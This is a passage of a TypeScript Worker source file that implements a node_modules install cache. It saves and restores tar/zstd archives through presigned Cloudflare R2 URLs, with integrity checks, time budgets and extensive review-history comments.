 * AS a symlink, never following it into whatever it points at. Two different
 * cases fall out of that default:
 *   - A symlink `node_modules/.bin/<tool>` (or, for a real yarn/pnpm-style
 *     workspace, a symlinked PACKAGE inside node_modules) — this is captured
 *     and restored FAITHFULLY: `tar -c` stores the symlink's own target
 *     string as a small metadata entry (not the target's bytes), and
 *     extraction recreates that exact link. Since both the link and whatever
 *     RELATIVE path it points at (the common case for package-manager-
 *     generated links) travel inside the same archived `node_modules` tree,
 *     the link still resolves correctly after a restore into a fresh
 *     checkout. This is intentional and safe — no gap here.
 *   - `node_modules` ITSELF being a symlink (rather than a real directory) —
 *     e.g. pointing at a shared store elsewhere on the container's
 *     filesystem — is NOT specially detected or rejected. `tar -C <dir> -c
 *     node_modules` would archive just that one symlink entry (its target
 *     string), never descending into the real tree it points at, producing a
 *     cache object with none of the actual dependency content. This is a
 *     residual gap, not a handled case — but one this feature's own design
 *     does not expect to hit in practice: every directory this file caches is
 *     meant to be its OWN independent install unit with its own real
 *     `node_modules` (see WORKSPACE_LOCK_MARKERS's own doc comment for why a
 *     hoisted/shared-store workspace, the shape that would actually produce
 *     a symlinked `node_modules`, is deliberately excluded from discovery
 *     entirely). If a future repo's install tooling ever DOES produce a
 *     symlinked `node_modules` for a directory this file discovers, the
 *     practical symptom would be a suspiciously tiny saved archive (well
 *     under the real dependency tree's size) rather than a loud failure —
 *     worth an operator's attention if `saved:<n>` bytes ever looks
 *     implausibly small for a repo this feature caches.
 */
export function installCacheSaveCmd(dir: string, capBytes: number = INSTALL_CACHE_MAX_BYTES): string {
  return (
    `if [ ! -d ${shQuote(dir)}/node_modules ]; then echo skip:no-node_modules; ` +
    `else ` +
    `set -o pipefail; ` +
    `tmp=$(mktemp /tmp/.install-cache-upload.XXXXXX); ` +
    `if tar -C ${shQuote(dir)} -c node_modules 2>"$tmp.tarerr" | zstd -q -c > "$tmp" 2>"$tmp.zsterr"; then ` +
    `size=$(stat -c%s "$tmp" 2>/dev/null || echo 0); ` +
    `if [ "$size" -eq 0 ]; then echo skip:empty; ` +
    `elif [ "$size" -gt ${capBytes} ]; then echo "skip:oversize:$size"; ` +
    `elif ! zstd -t "$tmp" >/dev/null 2>&1; then echo skip:corrupt-archive; ` +
    `elif ! zstd -dc "$tmp" 2>/dev/null | tar -tf - >/dev/null 2>&1; then echo skip:corrupt-archive; ` +
    `elif curl --fail --silent --show-error --connect-timeout 30 --speed-limit 1024 --speed-time 60 --max-time 900 ` +
    `-X PUT --upload-file "$tmp" "$${INSTALL_CACHE_URL_ENV}"; then echo "saved:$size"; ` +
    `else echo skip:upload-failed; fi; ` +
    `else echo skip:tar-or-compress-failed; fi; ` +
    `rm -f "$tmp" "$tmp.tarerr" "$tmp.zsterr"; ` +
    `fi`
  );
}

/** `installCacheSaveCmd`'s stdout, trimmed: `"saved:<n>"` on a genuine
 *  upload, `"skip:..."` on every guarded no-op. Split out as its own tiny
 *  parser (rather than string-matching inline at each call site) so a test
 *  can pin the exact skip reasons independently of the shell text. */
export function parseSaveOutcome(stdout: string): { saved: boolean; reason: string } {
  const trimmed = stdout.trim().split("\n").pop() ?? "";
  return { saved: trimmed.startsWith("saved:"), reason: trimmed || "unknown" };
}

// ---------------------------------------------------------------------------
// Presign — the new infrastructure this feature needs. R2's plain Workers
// binding (STUDIO_ARCHIVE, an R2Bucket — see do.ts's existing get/put/head/
// list/delete calls, env.ts's own doc comment on the binding) has NO
// presigned-URL method of its own; that only exists on R2's S3-COMPATIBLE
// API, authenticated with SigV4 against a DIFFERENT credential (an R2 API
// token's access key ID + secret access key) than the Workers binding uses.
// aws4fetch (github.com/mhart/aws4fetch, "a compact AWS client for modern JS
// environments") is the small, dependency-free, Workers-native SigV4 signer
// this Worker did not previously depend on — checked before committing to
// it: it is exactly the tool Cloudflare's own R2 presigned-URL docs point
// at, has no runtime dependencies of its own (so it costs nothing extra in
// bundle terms beyond itself), and its `AwsClient.sign(url, {aws:
// {signQuery: true}})` call is PURE, local SigV4 math (HMAC over the
// request) — no network round trip to mint a presigned URL, which is what
// makes presignR2 below unit-testable with real (fake) credentials and no
// fetch mock at all: test/install-cache.test.ts asserts the query
// parameters a signed URL carries directly.
//
// THREE NEW SECRETS THIS FEATURE NEEDS, none of which exist in this
// container and none of which this code can provision itself (an R2 API
// token is minted from the Cloudflare dashboard — the same class of
// operator-only action as every deploy this house's rules reserve for the
// maestro). The token should be scoped to ONLY the STUDIO_ARCHIVE
// bucket (this file's header, and this PR's own body, restate this for the
// maestro provisioning it) — this feature never touches any other bucket:
//
//   R2_ACCOUNT_ID          — the account id half of the R2 S3 endpoint
//                            (`https://<this>.r2.cloudflarestorage.com`).
//   R2_ACCESS_KEY_ID       — the R2 API token's access key id.
//   R2_SECRET_ACCESS_KEY   — the R2 API token's secret access key.
//
// All three `wrangler secret put`, never wrangler.jsonc `vars` (an access
// key/secret pair is exactly the credential class GITHUB_TOKEN/
// CLOUDFLARE_DEPLOY_TOKEN already get that treatment for). Until all three
// are set, presignR2 returns null for every call — see its own early-return
// below — and both orchestration functions in this file treat a null presign
// exactly like a genuine restore/save failure: log, skip, never degrade
// (the same "Failure = log, never degrade" ruling the sibling build-cache
// design states explicitly for itself, and #350 restates for this feature).
// So this code is safe to merge and even deploy (were it not otherwise held
// for the batched image window) with none of the three secrets set: it is
// then a complete, permanent no-op for every studio, gate or no gate.
// ---------------------------------------------------------------------------

/** Env slice presignR2 needs — a structural subset of the real `Env`
 *  (src/env.ts), so this file does not need to import that type and stays
 *  independently testable with a plain object literal, the same pattern
 *  accounts.ts's ClaudeAccountEnv draws for itself. */
export interface R2PresignEnv {
  R2_ACCOUNT_ID?: string;
  R2_ACCESS_KEY_ID?: string;
  R2_SECRET_ACCESS_KEY?: string;
  /** Issue #335 (public-release scrub): the real bucket name is config, not
   *  code — set as a wrangler.jsonc `vars` entry (not a secret: a bucket
   *  name isn't a credential), matching the STUDIO_ARCHIVE R2 binding's own
   *  real `bucket_name`. Absent falls back to R2_BUCKET_NAME_DEFAULT below. */
  R2_BUCKET_NAME?: string;
}

/** Neutral placeholder fallback for `R2PresignEnv.R2_BUCKET_NAME` — used only
 *  when the real operator config (env.R2_BUCKET_NAME, from wrangler.jsonc's
 *  `vars`) is absent, e.g. in tests. This string does NOT need to match any
 *  real bucket; the real value is asserted against the real
 *  `r2_buckets[0].bucket_name` binding by the operator's own ops-repo
 *  config, never by this source (round 1 of this file hardcoded the real
 *  bucket name directly here — exactly the leak issue #335 exists to fix). */
export const R2_BUCKET_NAME_DEFAULT = "studio-archive";

/** How long a minted URL stays valid — generous enough for even the top of
 *  #350's own measured 0.5-1.1 GiB range over a slow path, short enough that
 *  a leaked URL (a Worker log line, a container crash dump) is not usable
 *  for long. Applies to both directions; nothing here needs them to differ. */
export const INSTALL_CACHE_URL_TTL_SECONDS = 1800;

/**
 * Mints a presigned R2 URL for `key`, or `null` when the three secrets above
 * aren't all set, or when signing itself throws (malformed credentials,
 * anything) — never lets a presign failure escape as an exception into
 * either orchestration function's caller. `method` is "GET" for a restore,
 * "PUT" for a save; R2's S3 API validates the METHOD against the signature
 * at request time, so a URL signed for one can't be replayed as the other.
 *
 * `X-Amz-Expires` is added to the URL BEFORE signing, not passed as a
 * separate aws4fetch option — aws4fetch signs whatever query the URL already
 * carries and has no `expires` option of its own (checked against its own
 * type declarations rather than assumed); the presigned-URL expiry
 * convention is entirely this query parameter, part of what SigV4 itself
 * covers.
 */
export async function presignR2(
  env: R2PresignEnv, key: string, method: "GET" | "PUT",
  ttlSeconds: number = INSTALL_CACHE_URL_TTL_SECONDS,
): Promise<string | null> {
  const { R2_ACCOUNT_ID: accountId, R2_ACCESS_KEY_ID: accessKeyId, R2_SECRET_ACCESS_KEY: secretAccessKey } = env;
  if (!accountId || !accessKeyId || !secretAccessKey) return null;
  const bucketName = env.R2_BUCKET_NAME ?? R2_BUCKET_NAME_DEFAULT;
  try {
    const client = new AwsClient({ accessKeyId, secretAccessKey, service: "s3", region: "auto" });
    const url = new URL(`https://${accountId}.r2.cloudflarestorage.com/${bucketName}/${key}`);
    url.searchParams.set("X-Amz-Expires", String(ttlSeconds));
    const signed = await client.sign(url.toString(), { method, aws: { signQuery: true } });
    return signed.url;
  } catch (err) {
    console.error(`install-cache: presign ${method} ${key} failed`, err instanceof Error ? err.message : String(err));
    return null;
  }
}

// ---------------------------------------------------------------------------
// Restore orchestration — called from provision.ts's runProvision/runRestart
// right after runSessionRestore, per #350's own stated restore point. Mirrors
// runSessionRestore's own shape (a `deps`-driven function taking `id`, doing
// its own execs, never throwing what it can instead report) but lives here,
// not in provision.ts, so provision.ts's own diff for this feature is just
// the two call sites plus the two new optional ProvisionDeps ports.
//
// Round 2 review, item 1's redesign: this now DISCOVERS every cache-worthy
// directory under `repoDir` and runs the exact same per-directory decision
// tree the pre-redesign code ran once against `repoDir` itself, once per
// directory found. `runInstallCacheRestore`'s OWN signature is unchanged —
// still just `(deps, id, workRepoSlug, repoDir)` — so provision.ts's two
// call sites needed no changes at all for this redesign.
// ---------------------------------------------------------------------------

/** The narrow slice of ProvisionDeps this function needs — a structural
 *  subset, the same "narrow port, not the whole Deps bag" discipline this
 *  codebase already applies (see provision.ts's own header on Minimal
 *  storage ports). A real ProvisionDeps satisfies this with no cast. */
export interface InstallCacheRestoreDeps {
  sbExec(cmd: string, env?: Record<string, string>): Promise<{ code: number; stdout: string; stderr: string }>;
  /** Absent means the feature is entirely unwired for this deps instance —
   *  every ProvisionDeps literal built before this task, including every
   *  existing test fixture, never supplies it, and its absence must mean
   *  "behave exactly as today": zero execs, zero R2 calls. Same optionality
   *  contract every other ProvisionDeps port added since Task 3 (P2 plane 2)
   *  already follows (r2Get/writeFile/setKeepAlive/etc — see that interface's
   *  own doc comments). */
  installCacheEnabled?(workRepoSlug: string): boolean;
  installCachePresignGet?(key: string): Promise<string | null>;
  /** Deletes objects at the given keys — round 4 review, item 1: a restore
   *  failure whose cause is genuinely a corrupt archive (never a transient
   *  transfer blip — see `parseRestoreFailureReason`) tombstones the bad
   *  object so the NEXT save tick's `r2Head` check correctly sees it as gone
   *  and re-uploads, rather than a bad object sitting at its key forever
   *  (`r2Head` only ever checks EXISTENCE, never content — it structurally
   *  cannot detect this on its own, on the save side, no matter how often it
   *  re-checks). Optional, but with a DIFFERENT optionality shape than
   *  `installCacheEnabled`/`installCachePresignGet` above: its absence never
   *  disables restore entirely (an existing ProvisionDeps/test that never
   *  wires it must keep restoring exactly as before), it only means a
   *  corrupt-archive failure is reported as an ordinary `skip:restore-failed`
   *  instead of `skip:restore-failed-tombstoned` — no tombstone attempted,
   *  no crash either. */
  r2Delete?(keys: string[]): Promise<void>;
  /** Wall-clock source for the restore loop's own time budget (round 4
   *  review, item 5(c)) — same injected-clock convention as
   *  `InstallCacheSaveDeps.now()`, but under its OWN name rather than a
   *  shared `now()`: `ProvisionDeps` (provision.ts) already has a `now()` of
   *  its own returning an ISO `string` (its own established convention,
   *  threaded through `new Date(deps.now())` at its every call site), and
   *  `ProvisionDeps` is exactly what satisfies THIS interface in production
   *  — a same-named `now()` returning a `Date` here would conflict with that
   *  existing member the moment `ProvisionDeps` tried to extend both shapes
   *  at once, rather than genuinely composing with it. Optional, and with
   *  the SAME shape as `r2Delete` above, not `installCacheEnabled`'s:
   *  absence never disables restore, it only means no budget is enforced
   *  (every discovered directory is attempted, the behaviour every
   *  caller/test built before this task already gets) — a missing clock
   *  must never look like a reason to restore NOTHING. */
  installCacheRestoreNow?(): Date;
}

export type InstallCacheRestoreOutcome =
  | "skip:node_modules-present" | "skip:no-lockfile" | "skip:no-object" | "skip:restore-failed"
  | "skip:restore-failed-tombstoned" | "skip:unsafe-path" | "skip:restore-budget-exceeded" | "restored";

/** One discovered directory's own restore verdict. `relDir` is `""` for the
 *  checkout root, else a normalized relative path (`"apps/site-a"`) —
 *  `dirSlug` is what actually named its R2 key, carried alongside for a
 *  caller/test that wants to correlate the two without recomputing the
 *  hash. */
export interface InstallCacheDirRestoreResult {
  relDir: string; dirSlug: string; attempted: boolean; outcome: InstallCacheRestoreOutcome;
}

/** The whole restore call's own verdict — `outcome` stays a plain `string`
 *  (not a union) because it now SUMMARIZES however many directories were
 *  found (`"apps/site-a:restored, apps/site-b:skip:no-lockfile"`), or one of
 *  the top-level refusals (`"not-configured"`, `"gate:off"`,
 *  `"skip:no-lockfile"` for a repo where nothing was even discovered) when
 *  no per-directory loop ever ran. `dirs` is empty in exactly those
 *  top-level-refusal cases. `attempted` is true iff ANY directory attempted
 *  a genuine restore — the same boolean shape provision.ts's call sites
 *  already log on (`if (result.attempted) console.warn(...)`), so neither
 *  call site needed to change for this redesign. */
export interface InstallCacheRestoreResult {
  attempted: boolean;
  outcome: string;
  dirs: InstallCacheDirRestoreResult[];
}

async function restoreOneDir(
  deps: InstallCacheRestoreDeps, workRepoSlug: string, repoDir: string, relDir: string,
  maxTimeSeconds: number,
): Promise<InstallCacheDirRestoreResult> {
  const dir = absoluteCacheDir(repoDir, relDir);
  const slug = await dirSlug(relDir);
  // Round 4 review, item 3 — the real, filesystem-level containment check
  // (parseCacheDirs's own string-shape rejection already ran during
  // discovery; this is the SECOND, symlink-proof layer — guardDirWithinRepo's
  // own doc comment). Wrapped around nodeModulesPresentCmd, the first
  // per-directory command this flow already ran, rather than as its own
  // extra sbExec call — same number of exec calls as before.
  const presentRes = await deps.sbExec(guardDirWithinRepo(repoDir, dir, nodeModulesPresentCmd(dir)));
  if (presentRes.stdout.trim() === "unsafe-path") {
    console.error(`install cache restore of ${relDir || "."} refused: resolves outside the checkout root`);
    return { relDir, dirSlug: slug, attempted: false, outcome: "skip:unsafe-path" };
  }
  if (presentRes.stdout.trim() === "yes") {
    return { relDir, dirSlug: slug, attempted: false, outcome: "skip:node_modules-present" };
  }
  const hashRes = await deps.sbExec(lockHashCmd(dir));
  const lockHash = parseLockHash(hashRes.stdout);
  if (lockHash === null) {
    return { relDir, dirSlug: slug, attempted: false, outcome: "skip:no-lockfile" };
  }
  // installCacheEnabled/installCachePresignGet presence is checked by the
  // caller before this function is ever invoked (see runInstallCacheRestore
  // below) — `!` here documents that invariant rather than re-deriving it.
  const key = installCacheKey(workRepoSlug, slug, lockHash);
  const url = await deps.installCachePresignGet!(key);
  if (url === null) {
    return { relDir, dirSlug: slug, attempted: false, outcome: "skip:no-object" };
  }
  const restoreRes = await deps.sbExec(installCacheRestoreCmd(dir, maxTimeSeconds), { [INSTALL_CACHE_URL_ENV]: url });
  if (restoreRes.code !== 0) {
    console.error(
      `install cache restore of ${relDir || "."} failed (${restoreRes.code}): ${restoreRes.stderr.slice(0, 500)}`,
    );
    // Round 4 review, item 1 — TOMBSTONE. Only a failure this module can
    // positively attribute to the ARCHIVE ITSELF (never a transient transfer
    // blip — parseRestoreFailureReason's own doc comment) deletes the object,
    // and only when `r2Delete` is actually wired (its own optionality
    // contract, InstallCacheRestoreDeps's doc comment on that port). A failed
    // delete attempt falls through to the ordinary (non-tombstoned) outcome
    // below — never claim a tombstone that didn't actually happen.
    //
    // Round 5 review, item 4 — the strict `=== "archive"` equality below is
    // also what keeps a `"local"` reason (this STUDIO's own disk being full,
    // never the remote object's fault) from EVER reaching this branch: a
    // local out-of-space failure must never delete a perfectly good object
    // shared by every other studio of this repo. No separate exclusion
    // needed — `parseRestoreFailureReason` returning `"local"` (its own doc
    // comment) simply isn't `"archive"`, the same way `"transfer"`/`"unknown"`
    // already weren't.
    if (parseRestoreFailureReason(restoreRes.stdout) === "archive" && deps.r2Delete) {
      try {
        await deps.r2Delete([key]);
        return { relDir, dirSlug: slug, attempted: true, outcome: "skip:restore-failed-tombstoned" };
      } catch (err) {
        console.error(
          `install cache restore of ${relDir || "."}: tombstone delete of ${key} failed`,
          err instanceof Error ? err.message : String(err),
        );
      }
    }
    return { relDir, dirSlug: slug, attempted: true, outcome: "skip:restore-failed" };
  }
  return { relDir, dirSlug: slug, attempted: true, outcome: "restored" };
}

/** Round 4 review, item 5(c) — the restore loop's own wall-clock budget, in
 *  milliseconds. Comfortably under `provision.ts`'s own `OPERATION_STALE_MS`
 *  (15 minutes): 10 minutes here leaves the remaining 5 as margin for the
 *  rest of the provision/restart operation this loop runs inside (the clone,
 *  `runSessionRestore`, everything else that shares the same 15-minute
 *  budget) — see `runInstallCacheRestore`'s own doc comment for the 90-minute
 *  worst case (9 directories * 600s curl legs) this bounds. */
export const INSTALL_CACHE_RESTORE_BUDGET_MS = 10 * 60 * 1000;

// ---------------------------------------------------------------------------
// Round 5 review, item 3 (SUPERSEDED by round 6 review, item 2 — read this
// alongside `runInstallCacheRestore`'s own doc comment below for the CURRENT
// mechanism; kept here as history, not as documentation of live code):
//
// Round 5 added a "worst-case lookahead" pre-start check — a constant named
// `INSTALL_CACHE_RESTORE_DIR_WORST_CASE_MS` (600 * 1000, a single directory's
// own flat `--max-time 600` worst case), refusing to START a directory unless
// `elapsed + that constant` still fit inside `INSTALL_CACHE_RESTORE_BUDGET_MS`
// — meant to close a real overshoot the maestro measured (a 590s-per-directory
// case that started a second directory at 590s elapsed, then overshot
// `provision.ts`'s own 15-minute `OPERATION_STALE_MS`).
//
// That fix was itself a BLOCKER-severity bug, caught in round 6 review: the
// lookahead constant (600,000ms) was numerically IDENTICAL to the budget
// itself (`INSTALL_CACHE_RESTORE_BUDGET_MS`, also 600,000ms), which made the
// check `elapsed + 600000 > 600000` — true for ANY `elapsed > 0`. Only the
// very FIRST directory in a tick (elapsed exactly 0) could ever start; every
// other directory got `skip:restore-budget-exceeded` regardless of how fast
// the earlier directories actually finished. `example-org/websites` — this
// feature's own first and largest named target, 9 lockfile directories —
// restored at most 1 of 9 on any given tick.
//
// Fixed by dropping the lookahead-and-skip shape entirely (and deleting the
// now-unused `INSTALL_CACHE_RESTORE_DIR_WORST_CASE_MS` constant along with
// it — nothing else in this file ever read it) in favor of a DYNAMIC
// per-directory curl timeout: `installCacheRestoreCmd` now takes the actual
// remaining budget (capped at 600s) as its own `--max-time`, computed fresh
// for each directory right before it starts (see `runInstallCacheRestore`'s
// own loop). A directory near the edge of the budget still gets a real
// attempt — just with a correspondingly short timeout — instead of being
// skipped outright. The pre-start check itself goes back to the simpler
// round-4 shape: skip only once the budget is ALREADY exhausted (`elapsed >=
// INSTALL_CACHE_RESTORE_BUDGET_MS`), never a lookahead — there is no more
// need for one, since the per-directory timeout itself can never exceed what
// is actually left.
// ---------------------------------------------------------------------------

/**
 * Decides + performs the fresh-checkout install-cache restore, across every
 * cache-worthy directory `repoDir` contains. Ordered so the CHEAPEST, most
 * decisive checks run first and everything after them is skipped once one
 * refuses:
 *
 *   1. both ports wired at all (else: not-configured, zero execs) — mutant
 *      proof: a ProvisionDeps that never wires this feature must never touch
 *      the container or R2 either.
 *   2. the repo gate (else: gate:off, zero execs) — mutant proof: a
 *      gated-off repo makes NO sbExec call at all, including the discovery
 *      exec.
 *   3. per DISCOVERED DIRECTORY (round 2 review, item 1): `node_modules`
 *      already present (else: skip:node_modules-present — mutant proof: an
 *      existing node_modules is never restored over), a computable lockfile
 *      hash (else: skip:no-lockfile), a presigned URL for that hash's key
 *      (else: skip:no-object — covers both "the maestro's three secrets
 *      aren't set yet" and "no studio has ever cached this exact directory's
 *      exact lockfile hash", the ordinary mixed-fleet-safe case #350 names
 *      explicitly), and the transfer itself (else: skip:restore-failed).
 *
 * Never throws — every failure this function (or a single directory's own
 * restore within it) can observe becomes a returned outcome instead, so its
 * caller (runProvision/runRestart) can log it without needing its own
 * try/catch around this call for correctness (though both callers keep one
 * anyway, matching runSessionRestore's call-site precedent). A single
 * directory's own sbExec THROWING (a network blip mid-call, a malformed
 * sandbox-api response) is caught right at that directory, reported as its
 * own `skip:restore-failed`, and does not stop the OTHER directories in the
 * same repo from getting their own restore attempt.
 *
 * Round 4 review, item 5(c) — WALL-CLOCK BUDGET. Every directory's own
 * `installCacheRestoreCmd` allows its `curl` leg up to 600s, and this loop
 * runs every discovered directory SEQUENTIALLY, in the same call, awaited —
 * `example-org/websites` alone (this feature's own first and largest known
 * target) has 9 such directories, so a worst case of 9 * 600s ~= 90 minutes
 * is possible on the curl legs alone. But THIS call runs inside
 * `runProvision`/`runRestart`, which provision.ts's own `OPERATION_STALE_MS`
 * (15 minutes) budgets for the WHOLE operation, restore included — so
 * `INSTALL_CACHE_RESTORE_BUDGET_MS` below caps how long THIS loop alone may
 * run: once it is ALREADY exhausted, remaining directories get a clean,
 * explicit `skip:restore-budget-exceeded` outcome rather than silently never
 * being attempted, leaving margin under `OPERATION_STALE_MS` for the rest of
 * provision/restart's own work (the clone, `runSessionRestore`, etc.) to
 * still fit inside its own 15-minute budget. `deps.installCacheRestoreNow` is
 * OPTIONAL (`InstallCacheRestoreDeps`'s own doc comment on that port) — absent, no
 * budget is enforced at all (every directory is attempted, the exact
 * behaviour every caller/test built before this task already gets), rather
 * than a missing clock somehow meaning "restore nothing".
 *
 * Round 6 review, item 2 — DYNAMIC per-directory timeout, not a lookahead
 * skip. A directory that is NOT yet past the budget still gets a real
 * attempt, but `installCacheRestoreCmd`'s own `--max-time` is capped to
 * whatever budget genuinely remains (`min(600, remainingSeconds)`), computed
 * fresh right before that directory starts — never the flat 600s every
 * directory used to get regardless of how much budget was actually left. See
 * the (now-deleted) `INSTALL_CACHE_RESTORE_DIR_WORST_CASE_MS` constant's own
 * history comment, just above `INSTALL_CACHE_RESTORE_BUDGET_MS`, for the
 * round-5 regression this closes: with a flat 600s always granted plus a
 * lookahead-skip shape that turned out to have an off-by-a-coincidence bug
 * (the lookahead constant and the budget itself were numerically identical),
 * `example-org/websites`'s own 9 directories restored at most 1 per tick.
 * Now every directory gets a genuine restore attempt within whatever budget
 * remains, however small — a directory starting with only a few seconds left
 * simply gets a correspondingly short curl timeout instead of no attempt at
 * all.
 */
export async function runInstallCacheRestore(
  deps: InstallCacheRestoreDeps, id: string, workRepoSlug: string, repoDir: string,
): Promise<InstallCacheRestoreResult> {
  if (!deps.installCacheEnabled || !deps.installCachePresignGet) {
    return { attempted: false, outcome: "not-configured", dirs: [] };
  }
  if (!deps.installCacheEnabled(workRepoSlug)) {
    return { attempted: false, outcome: "gate:off", dirs: [] };
  }
  let relDirs: string[];
  try {
    const discoverRes = await deps.sbExec(discoverCacheDirsCmd(repoDir));
    relDirs = parseCacheDirs(discoverRes.stdout);
  } catch (err) {
    console.error(`studio ${id}: install cache directory discovery failed`, err instanceof Error ? err.message : String(err));
    return { attempted: false, outcome: "skip:restore-failed", dirs: [] };
  }
  if (relDirs.length === 0) {
    return { attempted: false, outcome: "skip:no-lockfile", dirs: [] };
  }
  const startedAt = deps.installCacheRestoreNow ? deps.installCacheRestoreNow().getTime() : null;
  const dirs: InstallCacheDirRestoreResult[] = [];
  for (const relDir of relDirs) {
    // Round 6 review, item 2 — see the (now-deleted)
    // INSTALL_CACHE_RESTORE_DIR_WORST_CASE_MS constant's own history comment
    // above INSTALL_CACHE_RESTORE_BUDGET_MS for why this is back to the
    // simpler round-4 shape (skip only once the budget is ALREADY exhausted)
    // rather than round 5's broken lookahead: the per-directory timeout below
    // is what now absorbs "how much budget is actually left", not this check.
    let maxTimeSeconds = 600;
    if (startedAt !== null) {
      const elapsedMs = deps.installCacheRestoreNow!().getTime() - startedAt;
      if (elapsedMs >= INSTALL_CACHE_RESTORE_BUDGET_MS) {
        dirs.push({ relDir, dirSlug: await dirSlug(relDir), attempted: false, outcome: "skip:restore-budget-exceeded" });
        continue;
      }
      const remainingMs = INSTALL_CACHE_RESTORE_BUDGET_MS - elapsedMs;
      maxTimeSeconds = Math.max(1, Math.min(600, Math.ceil(remainingMs / 1000)));
    }
    try {
      dirs.push(await restoreOneDir(deps, workRepoSlug, repoDir, relDir, maxTimeSeconds));
    } catch (err) {
      console.error(
        `studio ${id}: install cache restore of ${relDir || "."} threw`,
        err instanceof Error ? err.message : String(err),
      );
      dirs.push({ relDir, dirSlug: await dirSlug(relDir), attempted: false, outcome: "skip:restore-failed" });
    }
  }
  return {
    attempted: dirs.some((d) => d.attempted),
    outcome: dirs.map((d) => `${d.relDir || "."}:${d.outcome}`).join(", "),
    dirs,
  };
}

// ---------------------------------------------------------------------------
// Save orchestration — folded into the SAME 300s sync tick session-sync.ts's
// syncSessionTick already runs on (do.ts's syncSessionCycle calls both, one
// per tick), per #350's own "on the sync tick, at most once per lockHash
// change" cadence rule. do.ts's own round 2, item 5 fix (see do.ts's
// TICK_DEADLINES_MS doc comment) already detaches this ENTIRE call —
// covering however many directories it loops over internally — from the
// tick's own deadline: it is fired last, unawaited, so a slow save (or, now,
// several slow saves across several directories) can never starve
// failover/readiness/heal of their turn. Nothing about that detachment
// changes for this redesign: syncSessionCycle still makes exactly ONE call
// into this file per tick, unchanged.
// ---------------------------------------------------------------------------

export interface InstallCacheSaveDeps {
  sbExec(cmd: string, env?: Record<string, string>): Promise<{ code: number; stdout: string; stderr: string }>;
  presignPut(key: string): Promise<string | null>;
  /** Does an object already exist at this key? Checked before ever tarring
   *  node_modules: a repo with several studios/leads on the SAME lockfile
   *  hash for the SAME directory must not have every one of them re-upload
   *  the identical bytes — the first studio to reach this tick after a
   *  lockfile change wins, and every other studio's tick that ticks this
   *  SAME (directory, hash) pair after it just confirms the object is
   *  already there and moves on. See INSTALL_CACHE_REVERIFY_EVERY's own doc
   *  comment for why this is no longer trusted FOREVER once it says true. */
  r2Head(key: string): Promise<boolean>;
  r2List(prefix: string): Promise<{ key: string; uploaded: Date }[]>;
  r2Delete(keys: string[]): Promise<void>;
  /** Round 3 review, item 4 — the wall-clock source `installCacheFailureBackoffActive`
   *  below is compared against. A real deps builder supplies `() => new
   *  Date()`; tests supply a fixed/controllable clock so the backoff window
   *  itself can be driven deterministically rather than depending on real
   *  elapsed wall-clock time. */
  now(): Date;
  /** Raw `INSTALL_CACHE_REPOS` env value — parsed fresh by the gate check
   *  below on every call, the same "env-var parsing stays concentrated at
   *  the deps-builder boundary, not scattered" discipline do.ts's own
   *  syncDeps()/refreshDeps() doc comments already state for
   *  BURN_ALERT_OUTPUT_TOKENS_5H, kept here as a plain string rather than a
   *  pre-resolved boolean because (unlike a single studio's ProvisionDeps,
   *  built fresh with a known workRepoSlug already in hand) this deps object
   *  is built ONCE per DO and reused across every sync tick, and the repo
   *  isn't known until the tick itself reads STATUS_KEY. */
  installCacheRepos: string | undefined;
}

/** DO storage key for the lockfile hash one (studio, directory) pair last
 *  SUCCESSFULLY handled (either uploaded it itself, or confirmed R2 already
 *  had it) — what makes the cadence "at most once per lockHash change per
 *  directory" rather than "every tick, forever". `dirSlug`-keyed rather than
 *  the pre-redesign fixed `"installCacheHash"` literal — a monorepo with
 *  several cached directories needs one independent "last handled" marker
 *  PER directory, since their lockHash histories are unrelated to each
 *  other. */
export function installCacheHashKey(dirSlug: string): string {
  return `installCacheHash:${dirSlug}`;
}

/** How many consecutive ticks this studio may trust an `r2Head` "yes"
 *  (`already-cached`) WITHOUT itself re-tarring and re-uploading. Round 2
 *  review, item 3: before this, `r2Head` returning true was trusted
 *  PERMANENTLY for a given (directory, lockHash) key — the instant any
 *  object existed at that key, every studio that ever computed the same
 *  hash for the same directory (this studio again after a redeploy wiped
 *  its own "last handled" marker; a brand-new studio; a sibling studio on
 *  the same repo) would mark it handled and move on WITHOUT verifying it,
 *  forever. A single bad upload (disk-full, an OOM-killed tar, anything
 *  that predates this round's own tar/zstd integrity checks) at a given
 *  lockHash's key could never be replaced, because nothing would ever
 *  trigger a NEW upload attempt for a hash that hadn't itself changed.
 *
 *  Fixed by bounding how long the short-circuit alone may be trusted: once
 *  the streak of consecutive `r2Head`-trusting ticks (persisted per-dirSlug,
 *  reset to 0 on every occasion this studio does a REAL save attempt)
 *  reaches this many, the NEXT tick ignores `r2Head` entirely and performs
 *  the genuine tar-validate-upload path — which independently verifies
 *  (`zstd -t`, `zstd -dc | tar -tf -`) its OWN freshly-produced archive
 *  before ever PUTting it, so a successful re-upload from a studio whose own
 *  `node_modules` is healthy overwrites and heals whatever was at that key
 *  before, bad or not. Deliberately NOT "every tick" (that would be the
 *  thundering-herd re-upload problem `r2Head` exists to prevent in the first
 *  place, multiplied across however many studios share a repo) — a bounded,
 *  periodic re-check is the middle ground: a bad object is eventually
 *  replaceable, not permanently blocking, without every studio re-uploading
 *  a multi-GiB archive every single tick.
 *
 *  Round 3 review, item 1 — the fix above described a bound that was NEVER
 *  actually reachable in practice: this streak is only ever consulted from
 *  the `r2Head`-true branch below, which itself is only ever reached when
 *  `lastHandled !== lockHash` (a genuinely NEW hash for this directory) —
 *  because the `lastHandled === lockHash` branch used to `return` immediately
 *  with `"unchanged"`, before ever touching this streak at all. The instant a
 *  hash was first marked handled, EVERY subsequent tick for that same hash
 *  took that early return, so the streak variable for it froze at whatever
 *  value it held the one time it was set (0 or 1) and never moved again —
 *  measured directly: 50 ticks on an unchanged hash, 0 re-verifies. Fixed by
 *  making the `unchanged` path ALSO advance (and eventually exhaust) this
 *  same counter — see `saveOneDir`'s own comment at that branch. */
export const INSTALL_CACHE_REVERIFY_EVERY = 10;

/** DO storage key for the current `r2Head`-trusting streak of one
 *  (studio, directory) pair — see INSTALL_CACHE_REVERIFY_EVERY's own doc
 *  comment. */
export function installCacheReverifyKey(dirSlug: string): string {
  return `installCacheReverify:${dirSlug}`;
}

// ---------------------------------------------------------------------------
// Round 3 review, item 4 — a save FAILURE (oversize, disk-full, a corrupt
// archive, an upload that never lands) must not re-attempt every single tick
// forever: the whole cost this guards against (re-tarring a potentially
// multi-GiB `node_modules`, board #350's own 0.5-1.1 GiB range) is spent
// again on EVERY tick a naive "just retry next time" policy runs, for a
// reason (a full disk, an oversized dependency tree) that overwhelmingly has
